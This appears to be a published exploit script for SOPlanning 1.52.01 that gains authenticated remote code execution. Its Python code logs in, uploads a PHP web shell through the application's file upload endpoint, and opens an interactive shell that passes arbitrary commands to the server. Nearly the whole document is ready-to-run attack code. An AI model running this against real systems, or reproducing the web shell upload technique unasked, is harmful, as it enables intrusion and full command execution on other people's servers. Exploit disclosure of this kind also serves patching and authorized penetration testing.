# Exploit Title: SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)
# Date: 6th October, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Version: 1.52.01
# Tested on: Kali

import argparse
import requests
import random
import string
import urllib.parse


def command_shell(exploit_url):
    while True:
        try:
            commands = input("soplanning:~$ ")
            if commands.lower() in ["exit", "quit"]:
                print("Exiting shell.")
                break
            encoded_command = urllib.parse.quote_plus(commands)
            command_res = requests.get(f"{exploit_url}?cmd={encoded_command}")
            if command_res.status_code == 200:
                print(command_res.text.strip())
            else:
                print(
                    f"Error: {command_res.status_code} - {command_res.reason}"
                )
        except KeyboardInterrupt:
            print("\nExiting shell.")
            break


def exploit(username, password, url):
    target_url = f"{url}/process/login.php"
    upload_url = f"{url}/process/upload.php"
    link_id = "".join(
        random.choices(string.ascii_lowercase + string.digits, k=6)
    )
    php_filename = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}.php"

    login_data = {"login": username, "password": password}
    res = requests.post(target_url, data=login_data, allow_redirects=False)
    cookies = res.cookies

    multipart_form_data = {
        "linkid": link_id,
        "periodeid": 0,
        "fichiers": php_filename,
        "type": "upload",
    }

    web_shell = "<?php system($_GET['cmd']); ?>"
    files = {"fichier-0": (php_filename, web_shell, "application/x-php")}
    upload_res = requests.post(
        upload_url, cookies=cookies, files=files, data=multipart_form_data
    )

    if upload_res.status_code == 200 and "File" in upload_res.text:
        print(f"[+] File uploaded successfully to: {upload_res.text.strip()}")
        exploit_url = f"{url}/upload/files/{link_id}/{php_filename}"
        print(f"[+] Web shell is accessible at: {exploit_url}?cmd=<command>")
        if (
            input("Do you want an interactive shell? (yes/no) ").lower()
            == "yes"
        ):
            command_shell(exploit_url)


def main():
    parser = argparse.ArgumentParser(
        prog="SOplanning RCE", usage=f"python3 {__file__.split('/')[-1]}"
    )
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        help="Target URL",
        default="http://localhost/www",
    )
    parser.add_argument(
        "-u", "--username", type=str, help="username", default="user1"
    )
    parser.add_argument(
        "-p", "--password", type=str, help="password", default="user1"
    )
    args = parser.parse_args()

    exploit(args.username, args.password, args.target)


if __name__ == "__main__":
    main()
